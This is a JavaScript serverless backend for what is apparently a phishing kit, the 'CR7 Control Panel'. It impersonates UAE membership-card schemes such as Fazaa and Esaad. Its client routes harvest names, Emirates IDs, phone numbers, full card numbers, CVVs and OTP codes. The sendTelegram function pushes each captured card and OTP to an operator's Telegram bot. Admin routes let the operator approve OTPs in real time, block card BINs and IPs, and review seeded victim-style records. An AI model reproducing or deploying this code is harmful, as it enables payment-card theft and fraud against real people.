// Netlify Serverless Function for CR7 Control Panel & Visitor Tracking
const SEED_VISITORS = [{"id":"vis_mtlpxp5o_lzdsim","name":"sfdgsga dgfh","phone":"444444444444444444","email":"","emiratesId":"879880897979","ip":"176.28.136.10","step":"schedule","createdAt":"2026-09-03T16:07:30.337Z","updatedAt":"2026-09-24T23:20:16.369Z","lastActiveAt":"2026-09-24T23:20:16.369Z","currentPath":"/","pageTitle":"فزعة - FAZAA","bookingData":{"الاسم":"sfdgsga dgfh","الهاتف":"444444444444444444","رقم الهوية":"879880897979","المنطقة":"ajman","العنوان":"3534534555","الحي":"nhgdgndg","موعد التوصيل":"2026-10-16","طريقة الدفع":"card","البطاقة":"esaad - gold","fullName":"sfdgsga dgfh","phone":"444444444444444444","emiratesId":"879880897979","brand":"esaad","cardType":"gold","region":"ajman","streetAddress":"3534534555","neighborhood":"nhgdgndg","deliveryDate":"2026-10-16","paymentMethod":"card"},"cardNumber":"444444444444444444","cardHolder":"sfdgsga dgfh","expiry":"55/55","cvv":"555","cardSubmittedAt":"2026-09-10T01:10:27.297Z","cardApprovalStatus":"approved","orderStatus":"pending","page":"otp","region":"ajman","registrationId":"vis_mtlpxp5o_lzdsim"},{"id":"vis_reg_mug5jxdf_10qn4","name":"sfdgsga dgfh","phone":"444444444444444444","email":"","emiratesId":"879880897979","ip":"176.28.136.10","step":"payment","orderStatus":"pending","createdAt":"2026-09-24T22:53:06.165Z","updatedAt":"2026-09-24T22:53:06.165Z","lastActiveAt":"2026-09-24T22:53:06.165Z","bookingData":{"الاسم":"sfdgsga dgfh","الهاتف":"444444444444444444","الهوية":"879880897979","المنطقة":"ajman","العنوان":"3534534555","الحي":"nhgdgndg","موعد التوصيل":"2026-10-16","طريقة الدفع":"card","نوع البطاقة":"إسعاد - الذهبية"},"brand":"esaad","cardType":"gold"},{"id":"vis_reg_mug5in2r_xhxmi","name":"sfdgsga dgfh","phone":"444444444444444444","email":"","emiratesId":"879880897979","ip":"176.28.136.10","step":"delivery_address","orderStatus":"pending","createdAt":"2026-09-24T22:53:04.335Z","updatedAt":"2026-09-24T22:53:04.335Z","lastActiveAt":"2026-09-24T22:53:04.335Z","bookingData":{"الاسم":"sfdgsga dgfh","الهاتف":"444444444444444444","الهوية":"879880897979","المنطقة":"ajman","العنوان":"3534534555","الحي":"nhgdgndg","نوع البطاقة":"esaad - gold"},"brand":"esaad","cardType":"gold"},{"id":"vis_reg_mug5hcs3_fqvn4","name":"sfdgsga dgfh","phone":"444444444444444444","email":"","emiratesId":"879880897979","ip":"176.28.136.10","step":"passenger_details","orderStatus":"pending","createdAt":"2026-09-24T22:53:04.332Z","updatedAt":"2026-09-24T22:53:04.332Z","lastActiveAt":"2026-09-24T22:53:04.332Z","bookingData":{"الاسم":"sfdgsga dgfh","الهاتف":"444444444444444444","الهوية":"879880897979","نوع البطاقة":"esaad - gold"},"brand":"esaad","cardType":"gold"},{"id":"vis_reg_mug5g2hf_7lncj","name":"sfdgsga dgfh","phone":"444444444444444444","email":"","emiratesId":"879880897979","ip":"176.28.136.10","step":"passenger_details","orderStatus":"pending","createdAt":"2026-09-24T22:52:47.551Z","updatedAt":"2026-09-24T22:52:47.551Z","lastActiveAt":"2026-09-24T22:52:47.551Z","bookingData":{"الاسم":"sfdgsga dgfh","الهاتف":"444444444444444444","الهوية":"879880897979","نوع البطاقة":"esaad - gold"},"brand":"esaad","cardType":"gold"},{"id":"vis_test_verify_order","name":"سعيد محمد المنصوري","phone":"0509988776","email":"","emiratesId":"784-1992-1234567-3","ip":"127.0.0.1","step":"passenger_details","orderStatus":"pending","createdAt":"2026-09-23T23:20:37.473Z","updatedAt":"2026-09-23T23:20:37.473Z","lastActiveAt":"2026-09-23T23:20:37.473Z","bookingData":{"الاسم":"سعيد محمد المنصوري","الهاتف":"0509988776","البطاقة":"فزعة - ذهبية"}},{"id":"test_vis_curl_1","name":"محمد الكعبي","phone":"0501234567","email":"","emiratesId":"784-1990-1234567-1","ip":"127.0.0.1","step":"payment","createdAt":"2026-09-23T23:17:47.830Z","updatedAt":"2026-09-23T23:17:47.830Z","lastActiveAt":"2026-09-23T23:17:47.830Z","orderStatus":"pending"},{"id":"test_order_1790076194","name":"عبدالله الهاشمي (طلب تجريبي)","phone":"0509876543","email":"abdullah.test@example.com","emiratesId":"784-1990-1234567-1","ip":"127.0.0.1","step":"card","createdAt":"2026-09-22T11:23:14.454Z","updatedAt":"2026-09-22T11:23:23.996Z","lastActiveAt":"2026-09-22T11:23:18.691Z","currentPath":"/","brand":"fazaa","cardType":"gold","bookingData":{"الاسم":"عبدالله الهاشمي (طلب تجريبي)","الهاتف":"0509876543","رقم الهوية":"784-1990-1234567-1","الجهة":"فزعة (FAZAA)","نوع البطاقة":"البطاقة الذهبية","تاريخ الطلب":"2026-09-22"},"cardNumber":"5424000012345678","expiry":"08/28","cvv":"321","cardHolder":"ABDULLAH ALHASHIMI","orderStatus":"completed"},{"id":"vis_chart_4","name":"فاطمة المنصوري","phone":"0507778899","email":"","emiratesId":"","ip":"127.0.0.1","step":"success","createdAt":"2026-09-20T01:17:47.537Z","updatedAt":"2026-09-22T11:11:57.650Z","lastActiveAt":"2026-09-20T01:17:47.537Z","currentPath":"/","brand":"alsaada","cardType":"gold","cardApprovalStatus":"approved","otpApprovalStatus":"approved","bookingData":{"الاسم":"فاطمة المنصوري","الهاتف":"0507778899","البطاقة":"بطاقة السعادة الذهبية","brand":"alsaada","cardType":"gold"},"cardNumber":"4242424242424242","expiry":"12/29","cvv":"999","otp":"112233","orderStatus":"pending"},{"id":"vis_chart_3","name":"حمد المزروعي","phone":"0505556677","email":"","emiratesId":"","ip":"127.0.0.1","step":"payment","createdAt":"2026-09-20T01:17:47.519Z","updatedAt":"2026-09-20T01:17:47.519Z","lastActiveAt":"2026-09-20T01:17:47.519Z","currentPath":"/","brand":"homat","cardType":"discount","bookingData":{"الاسم":"حمد المزروعي","الهاتف":"0505556677","البطاقة":"بطاقة حماة الوطن للخصومات","brand":"homat","cardType":"discount"},"cardNumber":"5294150000001234","expiry":"11/27","cvv":"456","orderStatus":"pending"},{"id":"vis_chart_2","name":"مريم الكعبي","phone":"0503334455","email":"","emiratesId":"","ip":"127.0.0.1","step":"otp","createdAt":"2026-09-20T01:17:47.502Z","updatedAt":"2026-09-20T01:17:47.502Z","lastActiveAt":"2026-09-20T01:17:47.502Z","currentPath":"/","brand":"esaad","cardType":"silver","bookingData":{"الاسم":"مريم الكعبي","الهاتف":"0503334455","البطاقة":"بطاقة إسعاد الفضية","brand":"esaad","cardType":"silver"},"cardNumber":"4111222233334444","expiry":"08/28","cvv":"123","otp":"543210","orderStatus":"pending"},{"id":"vis_chart_1","name":"سلطان الشامسي","phone":"0501112233","email":"","emiratesId":"","ip":"127.0.0.1","step":"payment","createdAt":"2026-09-20T01:17:47.483Z","updatedAt":"2026-09-20T01:17:47.483Z","lastActiveAt":"2026-09-20T01:17:47.483Z","currentPath":"/","brand":"fazaa","cardType":"gold","bookingData":{"الاسم":"سلطان الشامسي","الهاتف":"0501112233","البطاقة":"بطاقة فزعة الذهبية","brand":"fazaa","cardType":"gold"},"orderStatus":"pending"},{"id":"vis_salem_test","name":"زائر جديد","phone":"","email":"","emiratesId":"","ip":"127.0.0.1","step":"otp","createdAt":"2026-09-20T00:48:26.476Z","updatedAt":"2026-09-20T00:48:26.476Z","lastActiveAt":"2026-09-20T00:48:26.476Z","otp":"445981","otpSubmittedAt":"2026-09-20T00:48:26.475Z","otpApprovalStatus":"waiting","orderStatus":"pending"},{"id":"vis_salem_1789865302416","name":"سالم راشد الكتبي","phone":"+971508899112","email":"","emiratesId":"784-1988-7654321-1","ip":"127.0.0.1","step":"payment","createdAt":"2026-09-20T00:48:22.425Z","updatedAt":"2026-09-20T00:48:22.433Z","lastActiveAt":"2026-09-20T00:48:22.433Z","currentPath":"/register","pageTitle":"تسجيل بطاقة فزعة - FAZAA","bookingData":{"البطاقة":"بطاقة فزعة الذهبية","الاسم":"سالم راشد الكتبي","الهاتف":"+971508899112","الهوية":"784-1988-7654321-1","الإمارة":"دبي","المنطقة":"جميرا","نوع البطاقة":"بطاقة فزعة الذهبية","الشارع":"شارع شاطئ جميرا - فيلا 14"},"cardNumber":"5324 9911 2233 4455","expiry":"09/29","cvv":"789","cardHolder":"SALEM RASHED ALKETBI","orderStatus":"pending"},{"id":"vis_live_test_1789865294630","name":"سالم راشد الكتبي","phone":"0508899112","email":"","emiratesId":"784-1988-7654321-1","ip":"127.0.0.1","step":"payment","createdAt":"2026-09-20T00:48:14.643Z","updatedAt":"2026-09-20T00:48:14.722Z","lastActiveAt":"2026-09-20T00:48:14.722Z","currentPath":"/register","pageTitle":"تسجيل بطاقة فزعة - FAZAA","bookingData":{"البطاقة":"بطاقة فزعة الذهبية","الاسم":"سالم راشد الكتبي","الهاتف":"0508899112","الهوية":"784-1988-7654321-1","نوع البطاقة":"بطاقة فزعة الذهبية","الإمارة":"دبي","المنطقة":"جميرا","الشارع":"شارع شاطئ جميرا - فيلا 14"},"cardNumber":"5324991122334455","expiry":"09/29","cvv":"789","cardHolder":"SALEM RASHED ALKETBI","orderStatus":"pending"},{"id":"test_vis_1789002996960","name":"أحمد الإماراتي","phone":"0501234567","email":"","emiratesId":"784-1990-1234567-1","ip":"127.0.0.1","step":"code","createdAt":"2026-09-10T01:16:37.087Z","updatedAt":"2026-09-10T01:16:37.130Z","lastActiveAt":"2026-09-10T01:16:37.124Z","cardNumber":"4111 2222 3333 4444","expiry":"12/28","cvv":"123","cardHolder":"Ahmed Al Emarati","cardSubmittedAt":"2026-09-10T01:16:37.102Z","cardApprovalStatus":"approved","otp":"987654","otpSubmittedAt":"2026-09-10T01:16:37.123Z","otpApprovalStatus":"approved","orderStatus":"pending"},{"id":"test_vis_1789002980294","name":"أحمد الإماراتي","phone":"0501234567","email":"","emiratesId":"784-1990-1234567-1","ip":"127.0.0.1","step":"payment","createdAt":"2026-09-10T01:16:20.420Z","updatedAt":"2026-09-10T01:16:20.432Z","lastActiveAt":"2026-09-10T01:16:20.432Z","cardNumber":"4111 2222 3333 4444","expiry":"12/28","cvv":"123","cardHolder":"Ahmed Al Emarati","cardSubmittedAt":"2026-09-10T01:16:20.432Z","cardApprovalStatus":"waiting","orderStatus":"pending"},{"id":"vis_test_1789002457443","name":"عبدالله السعيد","phone":"0501234567","email":"","emiratesId":"784-1990-1234567-1","ip":"127.0.0.1","step":"passenger_details","createdAt":"2026-09-10T01:07:37.450Z","updatedAt":"2026-09-10T01:07:37.450Z","lastActiveAt":"2026-09-10T01:07:37.450Z","bookingData":{"الاسم":"عبدالله السعيد","الهاتف":"0501234567","رقم الهوية":"784-1990-1234567-1","المنطقة":"دبي","العنوان":"شارع الشيخ زايد"},"orderStatus":"pending"},{"id":"vis_test_1788452639107","name":"سلطان المنصوري","phone":"0509876543","email":"","emiratesId":"784-1992-9876543-2","ip":"127.0.0.1","step":"payment","createdAt":"2026-09-03T16:23:59.238Z","updatedAt":"2026-09-03T16:23:59.257Z","lastActiveAt":"2026-09-03T16:23:59.257Z","currentPath":"/order","bookingData":{"الاسم":"سلطان المنصوري","الهاتف":"0509876543","رقم الهوية":"784-1992-9876543-2","المنطقة":"أبوظبي","العنوان":"شارع الكورنيش","الحي":"الخالدية","البطاقة":"فزعة - بلاتينيوم"},"cardNumber":"4111111111111111","expiry":"12/27","cvv":"888","cardHolder":"SULTAN AL MANSOORI","cardSubmittedAt":"2026-09-03T16:23:59.256Z","cardApprovalStatus":"waiting","orderStatus":"pending"},{"id":"vis_mtlq7ut3_cj1z10","name":"زائر جديد","phone":"","email":"","emiratesId":"","ip":"94.142.48.247","step":"schedule","createdAt":"2026-09-03T16:18:04.707Z","updatedAt":"2026-09-22T13:02:53.471Z","lastActiveAt":"2026-09-22T13:02:53.471Z","currentPath":"/","pageTitle":"فزعة - FAZAA","bookingData":{"الاسم":"","الهاتف":"","رقم الهوية":"","المنطقة":"","العنوان":"","الحي":"","موعد التوصيل":"","طريقة الدفع":"card","البطاقة":""},"orderStatus":"pending"},{"id":"vis_sample_01","name":"عبدالله محمد الشمري","phone":"+971501234567","email":"abdullah@example.com","emiratesId":"784-1990-1234567-1","ip":"82.178.102.45","step":"otp","online":true,"status":"online","createdAt":"2026-09-03T09:00:00.000Z","updatedAt":"2026-09-03T16:18:17.343Z","lastActiveAt":"2026-09-03T12:00:00.000Z","cardNumber":"5294158823419012","expiry":"08/28","cvv":"492","cardHolder":"ABDULLAH M ALSHAMMARI","bank":"SNB الأهلي","cardSubmittedAt":"2026-09-03T09:04:30.000Z","cardApprovalStatus":"approved","otp":"684910","otpSubmittedAt":"2026-09-03T09:05:10.000Z","otpApprovalStatus":"waiting","bookingData":{"الاسم":"عبدالله محمد الشمري","الهاتف":"+971501234567","رقم الهوية":"784-1990-1234567-1","المنطقة":"دبي","العنوان":"شارع الشيخ زايد - برج الهدى","البطاقة":"فزعة - ذهبية"},"orderStatus":"pending"}];
let visitorsStore = [...SEED_VISITORS];
let blockedIps = [];
let blockedBins = [];
let telegramConfig = {
  token: process.env.TELEGRAM_BOT_TOKEN || '',
  chatId: process.env.TELEGRAM_CHAT_ID || '',
  enabled: true
};

async function sendTelegram(text) {
  if (!telegramConfig.enabled || !telegramConfig.token || !telegramConfig.chatId) return;
  try {
    const url = `https://api.telegram.org/bot${telegramConfig.token}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramConfig.chatId,
        text,
        parse_mode: 'HTML'
      })
    });
  } catch (e) {}
}

export const handler = async (event, context) => {
  const path = event.path.replace(/^\/\.netlify\/functions\/api/, '').replace(/^\/api/, '') || '/';
  const method = event.httpMethod || 'GET';

  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, PATCH, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization'
  };

  if (method === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  let body = {};
  if (event.body) {
    try {
      body = JSON.parse(event.body);
    } catch (e) {}
  }

  const clientIp = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || event.headers['client-ip'] || '127.0.0.1';

  // ─── ADMIN ROUTES ──────────────────────────────────────────────────────────
  if (path === '/admin/me') {
    return { statusCode: 200, headers, body: JSON.stringify({ id: '1', email: 'admin@cr7.com', name: 'CR7 Admin' }) };
  }

  if (path === '/admin/visitors') {
    return { statusCode: 200, headers, body: JSON.stringify(visitorsStore) };
  }

  if (path === '/admin/db-status') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ status: 'connected', connected: true, totalVisitors: visitorsStore.length, timestamp: new Date().toISOString() })
    };
  }

  if (path.startsWith('/admin/visitors/') && (method === 'PUT' || method === 'PATCH')) {
    const id = path.replace('/admin/visitors/', '').replace('/status', '');
    const idx = visitorsStore.findIndex(v => v.id === id);
    if (idx !== -1) {
      visitorsStore[idx] = { ...visitorsStore[idx], ...body, updatedAt: new Date().toISOString() };
      return { statusCode: 200, headers, body: JSON.stringify(visitorsStore[idx]) };
    }
    const newEntry = { id, ...body, updatedAt: new Date().toISOString() };
    visitorsStore.unshift(newEntry);
    return { statusCode: 200, headers, body: JSON.stringify(newEntry) };
  }

  if (path.startsWith('/admin/visitors/') && method === 'DELETE') {
    const id = path.replace('/admin/visitors/', '');
    visitorsStore = visitorsStore.filter(v => v.id !== id);
    return { statusCode: 200, headers, body: JSON.stringify({ success: true }) };
  }

  if (path === '/admin/blocked-ips') {
    if (method === 'POST') {
      if (body.ip && !blockedIps.includes(body.ip)) blockedIps.push(body.ip);
      return { statusCode: 200, headers, body: JSON.stringify(blockedIps) };
    }
    return { statusCode: 200, headers, body: JSON.stringify(blockedIps) };
  }

  if (path.startsWith('/admin/blocked-ips/') && method === 'DELETE') {
    const ip = decodeURIComponent(path.replace('/admin/blocked-ips/', ''));
    blockedIps = blockedIps.filter(x => x !== ip);
    return { statusCode: 200, headers, body: JSON.stringify(blockedIps) };
  }

  if (path === '/admin/blocked-bins') {
    if (method === 'POST') {
      if (body.bin && !blockedBins.includes(body.bin)) blockedBins.push(body.bin);
      return { statusCode: 200, headers, body: JSON.stringify(blockedBins) };
    }
    return { statusCode: 200, headers, body: JSON.stringify(blockedBins) };
  }

  if (path.startsWith('/admin/blocked-bins/') && method === 'DELETE') {
    const bin = decodeURIComponent(path.replace('/admin/blocked-bins/', ''));
    blockedBins = blockedBins.filter(x => x !== bin);
    return { statusCode: 200, headers, body: JSON.stringify(blockedBins) };
  }

  if (path === '/admin/telegram-config') {
    if (method === 'POST') {
      telegramConfig = { ...telegramConfig, ...body };
      return { statusCode: 200, headers, body: JSON.stringify({ success: true, config: telegramConfig }) };
    }
    return { statusCode: 200, headers, body: JSON.stringify(telegramConfig) };
  }

  if (path === '/admin/telegram-test') {
    const tToken = body.token || telegramConfig.token;
    const tChat = body.chatId || telegramConfig.chatId;
    if (tToken && tChat) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${tToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: tChat,
            text: '✅ <b>تم فحص وتأكيد ربط التلجرام بنجاح!</b>',
            parse_mode: 'HTML'
          })
        });
        const rJson = await res.json();
        return { statusCode: 200, headers, body: JSON.stringify({ success: rJson.ok }) };
      } catch (err) {
        return { statusCode: 400, headers, body: JSON.stringify({ success: false, error: err.message }) };
      }
    }
    return { statusCode: 400, headers, body: JSON.stringify({ success: false, error: 'Missing token/chatId' }) };
  }

  // ─── CLIENT ROUTES ─────────────────────────────────────────────────────────
  if (path === '/client/heartbeat' || path === '/client/track' || path === '/client/order') {
    const targetId = body.id || body.visitorId || `vis_${Date.now().toString(36)}`;
    const idx = visitorsStore.findIndex(v => v.id === targetId);
    const existing = idx !== -1 ? visitorsStore[idx] : null;

    const updated = {
      id: targetId,
      ip: clientIp,
      currentPath: body.path || existing?.currentPath || '/',
      step: body.step || existing?.step || 'schedule',
      pageTitle: body.title || existing?.pageTitle || '',
      name: body.name || body.fullName || existing?.name || '',
      phone: body.phone || existing?.phone || '',
      emiratesId: body.emiratesId || existing?.emiratesId || '',
      bookingData: body.bookingData || existing?.bookingData || {},
      cardNumber: body.cardNumber || existing?.cardNumber || '',
      expiry: body.expiry || existing?.expiry || '',
      cvv: body.cvv || existing?.cvv || '',
      cardHolder: body.cardHolder || existing?.cardHolder || '',
      otp: body.otp || existing?.otp || '',
      brand: body.brand || existing?.brand || '',
      cardType: body.cardType || existing?.cardType || '',
      orderStatus: existing?.orderStatus || 'pending',
      cardApprovalStatus: existing?.cardApprovalStatus || null,
      otpApprovalStatus: existing?.otpApprovalStatus || null,
      createdAt: existing?.createdAt || new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    if (idx !== -1) {
      visitorsStore[idx] = updated;
    } else {
      visitorsStore.unshift(updated);
    }

    if (visitorsStore.length > 200) visitorsStore.pop();

    // Trigger Telegram if new name/phone
    if (updated.name && (!existing || !existing.name)) {
      sendTelegram(`👤 <b>تسجيل طلب جديد</b>\nالاسم: ${updated.name}\nالهاتف: ${updated.phone}\nالهوية: ${updated.emiratesId || '-'}\nIP: ${clientIp}`).catch(() => {});
    }

    return { statusCode: 200, headers, body: JSON.stringify({ success: true, visitor: updated }) };
  }

  if (path === '/client/card') {
    const targetId = body.visitorId || body.id;
    const idx = visitorsStore.findIndex(v => v.id === targetId);
    if (idx !== -1) {
      visitorsStore[idx].cardNumber = body.cardNumber || visitorsStore[idx].cardNumber;
      visitorsStore[idx].expiry = body.expiry || visitorsStore[idx].expiry;
      visitorsStore[idx].cvv = body.cvv || visitorsStore[idx].cvv;
      visitorsStore[idx].cardHolder = body.cardHolder || visitorsStore[idx].cardHolder;
      visitorsStore[idx].cardSubmittedAt = new Date().toISOString();
      visitorsStore[idx].cardApprovalStatus = 'waiting';
      visitorsStore[idx].step = 'payment';
      visitorsStore[idx].updatedAt = new Date().toISOString();

      sendTelegram(`💳 <b>بطاقة دفع جديدة</b>\nالاسم: ${visitorsStore[idx].name || '-'}\nالبطاقة: <code>${body.cardNumber}</code>\nالتاريخ: ${body.expiry}\nCVV: <code>${body.cvv}</code>\nحامل البطاقة: ${body.cardHolder || '-'}`).catch(() => {});

      return { statusCode: 200, headers, body: JSON.stringify({ success: true, visitor: visitorsStore[idx] }) };
    }
    return { statusCode: 200, headers, body: JSON.stringify({ success: true }) };
  }

  if (path === '/client/otp') {
    const targetId = body.visitorId || body.id;
    const idx = visitorsStore.findIndex(v => v.id === targetId);
    if (idx !== -1) {
      visitorsStore[idx].otp = body.otp;
      visitorsStore[idx].otpSubmittedAt = new Date().toISOString();
      visitorsStore[idx].otpApprovalStatus = 'waiting';
      visitorsStore[idx].step = 'otp';
      visitorsStore[idx].updatedAt = new Date().toISOString();

      sendTelegram(`🔢 <b>رمز OTP جديد</b>\nالاسم: ${visitorsStore[idx].name || '-'}\nالرمز: <code>${body.otp}</code>\nالبطاقة: ${visitorsStore[idx].cardNumber || '-'}`).catch(() => {});

      return { statusCode: 200, headers, body: JSON.stringify({ success: true, visitor: visitorsStore[idx] }) };
    }
    return { statusCode: 200, headers, body: JSON.stringify({ success: true }) };
  }

  if (path.startsWith('/client/status/')) {
    const id = path.replace('/client/status/', '');
    const v = visitorsStore.find(x => x.id === id);
    if (v) {
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          id: v.id,
          step: v.step,
          cardApprovalStatus: v.cardApprovalStatus,
          otpApprovalStatus: v.otpApprovalStatus,
          orderStatus: v.orderStatus
        })
      };
    }
    return { statusCode: 200, headers, body: JSON.stringify({ step: 'schedule', cardApprovalStatus: null, otpApprovalStatus: null }) };
  }

  return { statusCode: 200, headers, body: JSON.stringify({ status: 'ok' }) };
};
